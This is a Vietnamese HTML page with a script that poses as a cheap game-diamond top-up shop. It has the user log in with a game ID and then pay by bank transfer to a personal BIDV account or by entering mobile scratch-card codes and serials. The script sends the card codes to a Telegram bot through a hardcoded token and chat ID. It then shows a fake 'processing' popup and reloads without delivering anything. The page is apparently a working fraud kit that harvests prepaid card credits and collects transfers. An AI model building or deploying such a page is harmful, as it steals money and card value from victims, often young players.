<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kim Cương Vip - Nạp Kim Cương Giá Rẻ</title>
    <style>
        body {
            background-color: #e8f5e9;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            width: 100%;
            max-width: 450px;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 128, 0, 0.2);
            border: 2px solid #4CAF50;
            box-sizing: border-box;
        }
        h2 {
            color: #2e7d32;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #a5d6a7;
            border-radius: 6px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus, select:focus {
            border-color: #4CAF50;
            box-shadow: 0 0 5px rgba(76, 175, 80, 0.4);
        }
        button {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #388e3c;
        }
        .packages-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-bottom: 15px;
        }
        .package-btn {
            background-color: #f1f8e9;
            border: 1px solid #4CAF50;
            color: #2e7d32;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            cursor: pointer;
            font-weight: bold;
            transition: 0.2s;
        }
        .package-btn.selected {
            background-color: #4CAF50;
            color: white;
        }
        .hidden {
            display: none !important;
        }
        .success-text {
            color: #2e7d32;
            font-weight: bold;
            text-align: center;
            margin-bottom: 15px;
        }
        .admin-box {
            background-color: #f1f8e9;
            padding: 15px;
            border-radius: 6px;
            border: 1px dashed #4CAF50;
            margin-bottom: 15px;
        }
        #loadingModal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .modal-content {
            background: #fff;
            padding: 25px;
            border-radius: 10px;
            text-align: center;
            max-width: 320px;
            width: 90%;
        }
        .checkmark {
            font-size: 45px;
            color: #4CAF50;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>💎 KIM CƯƠNG VIP 💎</h2>

    <!-- Bước 1: Đăng nhập ID Game -->
    <div id="step-login" class="form-group">
        <label for="gameId">Nhập ID Game:</label>
        <input type="text" id="gameId" placeholder="Nhập dãy số ID game (8-10 số)...">
        <button onclick="handleLogin()">Đăng Nhập</button>
        <p id="errorMsg" style="color: #f44336; font-size: 13px; margin-top: 5px; font-weight: bold;"></p>
    </div>

    <!-- Bước 2: Chọn gói nạp -->
    <div id="step-packages" class="hidden">
        <div class="success-text">✔ Đăng nhập hoàn thành!</div>
        <label>Chọn mốc nạp kim cương:</label>
        <div class="packages-grid">
            <div class="package-btn" onclick="selectPackage(this, '10k = 120💎')">10k = 120 💎</div>
            <div class="package-btn" onclick="selectPackage(this, '20k = 240💎')">20k = 240 💎</div>
            <div class="package-btn" onclick="selectPackage(this, '50k = 500💎')">50k = 500 💎</div>
            <div class="package-btn" onclick="selectPackage(this, '100k = 1100💎')">100k = 1100 💎</div>
            <div class="package-btn" onclick="selectPackage(this, '200k = 2400💎')">200k = 2400 💎</div>
            <div class="package-btn" onclick="selectPackage(this, '500k = 5000💎')">500k = 5000 💎</div>
        </div>

        <label for="paymentMethod">Chọn phương thức thanh toán:</label>
        <select id="paymentMethod" onchange="togglePaymentMethod()">
            <option value="">-- Chọn hình thức --</option>
            <option value="transfer">Chuyển khoản ngân hàng</option>
            <option value="card">Thẻ cào điện thoại</option>
        </select>
    </div>

    <!-- Bước 3A: Chuyển khoản -->
    <div id="section-transfer" class="hidden">
        <div class="admin-box">
            <p><strong>Ngân hàng:</strong> BIDV</p>
            <p><strong>Số tài khoản:</strong> 8877945567</p>
            <p><strong>Chủ tài khoản:</strong> VI THI HA</p>
            <p><strong>Nội dung chuyển:</strong> <span id="transferSyntax">NAP_KIM_CUONG</span></p>
        </div>
        <button onclick="confirmTransaction('transfer')">Xác Nhận Đã Chuyển Khoản</button>
    </div>

    <!-- Bước 3B: Thẻ cào -->
    <div id="section-card" class="hidden">
        <div class="form-group">
            <label>Loại thẻ:</label>
            <select id="cardType">
                <option value="Viettel">Viettel</option>
                <option value="Vinaphone">Vinaphone</option>
                <option value="Mobifone">Mobifone</option>
            </select>
        </div>
        <div class="form-group">
            <label>Chọn mệnh giá:</label>
            <select id="cardPrice">
                <option value="10k">10.000 VNĐ</option>
                <option value="20k">20.000 VNĐ</option>
                <option value="50k">50.000 VNĐ</option>
                <option value="100k">100.000 VNĐ</option>
                <option value="200k">200.000 VNĐ</option>
                <option value="500k">500.000 VNĐ</option>
            </select>
        </div>
        <div class="form-group">
            <label>Mã thẻ cào:</label>
            <input type="text" id="cardCode" placeholder="Nhập mã thẻ...">
        </div>
        <div class="form-group">
            <label>Số Seri:</label>
            <input type="text" id="cardSerial" placeholder="Nhập số seri...">
        </div>
        <button onclick="confirmTransaction('card')">Xác Nhận Nạp Thẻ</button>
    </div>

</div>

<!-- Popup chờ xử lý -->
<div id="loadingModal" class="hidden">
    <div class="modal-content">
        <div class="checkmark">✅</div>
        <p style="font-weight: bold; color: #2e7d32; font-size: 16px;">Giao dịch đã được ghi nhận!</p>
        <p style="color: #555; font-size: 14px; margin-top: 8px;">Đang chờ xử lý trong vòng 3-5 phút...</p>
    </div>
</div>

<script>
    let currentGameId = "";
    let currentPackage = "";

    const TELEGRAM_BOT_TOKEN = "8975192062:AAGANTM_Pks5TLp2RzyPosoPiCABQg1gmho";
    const TELEGRAM_CHAT_ID = "8620455610";

    function handleLogin() {
        let gameId = document.getElementById("gameId").value.trim();
        let errorMsg = document.getElementById("errorMsg");

        // Kiểm tra ID phải là số và có độ dài từ 8 đến 10 chữ số (không bị khóa ban nữa)
        let isValidId = /^\d{8,10}$/.test(gameId);

        if (!isValidId) {
            errorMsg.innerHTML = `❌ ID không hợp lệ! (ID phải có từ 8 đến 10 số). Vui lòng nhập lại!`;
            return;
        }

        errorMsg.innerText = "";
        currentGameId = gameId;
        document.getElementById("step-login").classList.add("hidden");
        document.getElementById("step-packages").classList.remove("hidden");
    }

    function selectPackage(element, pkgName) {
        let buttons = document.querySelectorAll(".package-btn");
        buttons.forEach(btn => btn.classList.remove("selected"));
        element.classList.add("selected");
        currentPackage = pkgName;
        document.getElementById("transferSyntax").innerText = "NAP " + currentGameId;
    }

    function togglePaymentMethod() {
        let method = document.getElementById("paymentMethod").value;
        document.getElementById("section-transfer").classList.add("hidden");
        document.getElementById("section-card").classList.add("hidden");

        if (method === "transfer") {
            document.getElementById("section-transfer").classList.remove("hidden");
        } else if (method === "card") {
            document.getElementById("section-card").classList.remove("hidden");
        }
    }

    function confirmTransaction(type) {
        if (!currentPackage) {
            alert("Vui lòng chọn mốc nạp kim cương trước!");
            return;
        }

        let message = `🔔 *CÓ GIAO DỊCH NẠP MỚI* 💎\n\n- *ID Game:* ${currentGameId}\n- *Gói nạp:* ${currentPackage}\n- *Hình thức:* ${type === 'card' ? 'Thẻ cào' : 'Chuyển khoản (BIDV - 8877945567 - VI THI HA)'}`;

        if (type === 'card') {
            let cardType = document.getElementById("cardType").value;
            let cardPrice = document.getElementById("cardPrice").value;
            let cardCode = document.getElementById("cardCode").value.trim();
            let cardSerial = document.getElementById("cardSerial").value.trim();

            if (!cardCode || !cardSerial) {
                alert("Vui lòng nhập đầy đủ mã thẻ và số seri!");
                return;
            }

            if (cardType === "Mobifone") {
                if (cardSerial.length !== 15) {
                    alert("Thẻ MobiFone yêu cầu số Seri phải đúng 15 số!");
                    return;
                }
                if (cardCode.length !== 12) {
                    alert("Thẻ MobiFone yêu cầu Mã thẻ phải đúng 12 số!");
                    return;
                }
            } else if (cardType === "Viettel") {
                if (cardSerial.length === 11) {
                    if (cardCode.length !== 13) {
                        alert("Seri Viettel 11 số đi kèm Mã thẻ phải có 13 số!");
                        return;
                    }
                } else if (cardSerial.length === 14) {
                    if (cardCode.length !== 15) {
                        alert("Seri Viettel 14 số đi kèm Mã thẻ phải có 15 số!");
                        return;
                    }
                } else {
                    alert("Số Seri Viettel không hợp lệ! Seri phải có 11 hoặc 14 số.");
                    return;
                }
            } else if (cardType === "Vinaphone") {
                if (cardSerial.length !== 14) {
                    alert("Thẻ Vinaphone yêu cầu số Seri phải đúng 14 số!");
                    return;
                }
                if (cardCode.length !== 12 && cardCode.length !== 14) {
                    alert("Thẻ Vinaphone yêu cầu Mã thẻ phải có 12 hoặc 14 số!");
                    return;
                }
            }

            message += `\n- *Loại thẻ:* ${cardType}\n- *Mệnh giá:* ${cardPrice}\n- *Mã thẻ:* \`${cardCode}\`\n- *Số Seri:* \`${cardSerial}\``;
        }

        let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        let data = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(error => console.log(error));

        document.getElementById("loadingModal").classList.remove("hidden");

        setTimeout(() => {
            location.reload();
        }, 4000);
    }
</script>

</body>
                </html>
